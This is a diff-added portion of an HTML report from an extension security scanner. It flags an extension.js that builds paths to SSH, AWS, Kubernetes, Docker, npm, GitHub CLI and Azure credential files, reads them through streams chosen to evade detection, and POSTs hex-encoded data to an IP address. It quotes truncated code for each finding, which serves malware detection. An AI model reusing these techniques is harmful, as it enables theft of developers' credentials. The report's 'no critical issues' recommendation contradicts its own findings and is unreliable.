+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">0</span><span style="color: #e2e8f0;">Known password/token file access + File reading via createReadStream + HTTP POST with sensitive data</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 0</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🚨 Credential path via path.join with homedir</div>
+                    <div class="threat-severity high">high</div>
+                </div>
+                <div class="threat-description">Sensitive credential path built via path.join - evades string literal detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> credential_theft
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:17</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">17</span><span style="color: #e2e8f0;">eral with .ssh/) ---     <span class=<span class="code-string">"code-keyword"</span>>const</span> sshDir = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.ssh&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> awsDir = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 17</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🚨 Credential path via path.join with homedir</div>
+                    <div class="threat-severity high">high</div>
+                </div>
+                <div class="threat-description">Sensitive credential path built via path.join - evades string literal detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> credential_theft
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:18</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">18</span><span style="color: #e2e8f0;">.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.ssh&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> awsDir = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.aws&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> kubeConfig = path.<span class=<span class="code-string">"code-function"</span>>join</span>(hom</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 18</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🚨 Credential path via path.join with homedir</div>
+                    <div class="threat-severity high">high</div>
+                </div>
+                <div class="threat-description">Sensitive credential path built via path.join - evades string literal detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> credential_theft
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:19</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">19</span><span style="color: #e2e8f0;"><span class=<span class="code-string">"code-function"</span>>n</span>(home, &#x27;.aws&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> kubeConfig = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.kube&#x27;, &#x27;config&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> dockerConfig = p</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 19</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🚨 Credential path via path.join with homedir</div>
+                    <div class="threat-severity high">high</div>
+                </div>
+                <div class="threat-description">Sensitive credential path built via path.join - evades string literal detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> credential_theft
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:20</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">20</span><span style="color: #e2e8f0;">e&#x27;, &#x27;config&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> dockerConfig = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.docker&#x27;, &#x27;config.json&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> npmrc = pat</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 20</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🚨 Credential path via path.join with homedir</div>
+                    <div class="threat-severity high">high</div>
+                </div>
+                <div class="threat-description">Sensitive credential path built via path.join - evades string literal detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> credential_theft
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:21</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">21</span><span style="color: #e2e8f0;">ker&#x27;, &#x27;config.json&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> npmrc = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.npmrc&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> ghConfig = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home,</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 21</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🚨 Credential path via path.join with homedir</div>
+                    <div class="threat-severity high">high</div>
+                </div>
+                <div class="threat-description">Sensitive credential path built via path.join - evades string literal detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> credential_theft
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:23</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">23</span><span style="color: #e2e8f0;">, &#x27;hosts.yml&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> azureTokens = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.azure&#x27;, &#x27;accessTokens.json&#x27;);      <span class="code-comment">// --- fs.</span></span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 23</div>
+            </div>
+
+            <div class="threat-item medium">
+                <div class="threat-header">
+                    <div class="threat-name">⚠️ HTTP POST with sensitive data</div>
+                    <div class="threat-severity medium">medium</div>
+                </div>
+                <div class="threat-description">Sends data via HTTP POST request</div>
+
+                <div class="context-analysis" style="margin: 10px 0; padding: 12px 15px; background: rgba(59, 130, 246, 0.1); border-left: 3px solid #3b82f6; border-radius: 4px; font-size: 13px; color: #cbd5e1; line-height: 1.5;">
+                    <strong style="color: #60a5fa;">Context Analysis:</strong> Data is being sent to an external server. Review what data is being collected and whether the destination is a legitimate service or an untrusted endpoint.
+                </div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> network_exfil
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:56</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">56</span><span style="color: #e2e8f0;">d: hexEncoded });          <span class=<span class="code-string">"code-keyword"</span>>const</span> req = https.<span class=<span class="code-string">"code-function"</span>>request</span>({             hostname: &#x27;192.0.2.85&#x27;,             port: 443,             path: &#x27;/api/scan-results&#x27;,             method: &#x27;POST&#x27;,             headers</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 56</div>
+            </div>
+
+            <div class="threat-item medium">
+                <div class="threat-header">
+                    <div class="threat-name">⚠️ File reading via createReadStream</div>
+                    <div class="threat-severity medium">medium</div>
+                </div>
+                <div class="threat-description">Reads files via stream - bypasses readFile/readFileSync detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> workspace_harvesting
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:25</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">25</span><span style="color: #e2e8f0;">ure&#x27;, &#x27;accessTokens.json&#x27;);      <span class="code-comment">// --- fs.createReadStream (bypasses readFile/readFileSync) ---</span></span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 25</div>
+            </div>
+
+            <div class="threat-item medium">
+                <div class="threat-header">
+                    <div class="threat-name">⚠️ File reading via createReadStream</div>
+                    <div class="threat-severity medium">medium</div>
+                </div>
+                <div class="threat-description">Reads files via stream - bypasses readFile/readFileSync detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> workspace_harvesting
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:28</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">28</span><span style="color: #e2e8f0;">esolve) =&gt; {             <span class=<span class="code-string">"code-keyword"</span>>const</span> stream = fs.<span class=<span class="code-string">"code-function"</span>>createReadStream</span>(filePath, { encoding: &#x27;utf-8&#x27; });</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 28</div>
+            </div>
+
+            <div class="threat-item medium">
+                <div class="threat-header">
+                    <div class="threat-name">⚠️ Async directory listing via fs.promises / fs/promises</div>
+                    <div class="threat-severity medium">medium</div>
+                </div>
+                <div class="threat-description">Async directory listing bypasses fs.readdirSync detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> workspace_harvesting
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:36</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">36</span><span style="color: #e2e8f0;"><span class=<span class="code-string">"code-function"</span>>e</span>(null));         });     }      <span class="code-comment">// --- fs.promises.readdir (bypasses fs.readdirSync/readdir patterns</span></span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 36</div>
+            </div>
+
+            <div class="threat-item medium">
+                <div class="threat-header">
+                    <div class="threat-name">⚠️ Async directory listing via fs.promises / fs/promises</div>
+                    <div class="threat-severity medium">medium</div>
+                </div>
+                <div class="threat-description">Async directory listing bypasses fs.readdirSync detection</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> workspace_harvesting
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:39</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">39</span><span style="color: #e2e8f0;"><span class=<span class="code-string">"code-keyword"</span>>try</span> {             <span class=<span class="code-string">"code-keyword"</span>>const</span> entries = <span class=<span class="code-string">"code-keyword"</span>>await</span> fsp.<span class=<span class="code-string">"code-function"</span>>readdir</span>(dir, { withFileTypes: true });</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 39</div>
+            </div>
+
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">🎯</div>
+                <div class="section-title">Security Recommendations</div>
+            </div>
+            <div class="recommendations ">
+                <h3>✅ Recommended Actions</h3>
+                <div class="rec-list">
+<div class="rec-item"><div class="rec-icon">▸</div><div>No immediately critical issues identified</div></div><div class="rec-item"><div class="rec-icon">▸</div><div>Standard security practices apply</div></div><div class="rec-item"><div class="rec-icon">▸</div><div>Implement version pinning for stability</div></div><div class="rec-item"><div class="rec-icon">▸</div><div>Periodic re-assessment recommended (quarterly)</div></div><div class="rec-item"><div class="rec-icon">▸</div><div>Monitor for significant updates</div></div>
+                </div>
+            </div>
+        </div>
+</div>
+        <div class="report-footer">
+            <div class="footer-logo">Extension Security Analyzer</div>
+            <div>Professional Threat Analysis • Powered by VirusTotal & Static Analysis</div>
+        </div>
+    </div>
+</body>
+</html>
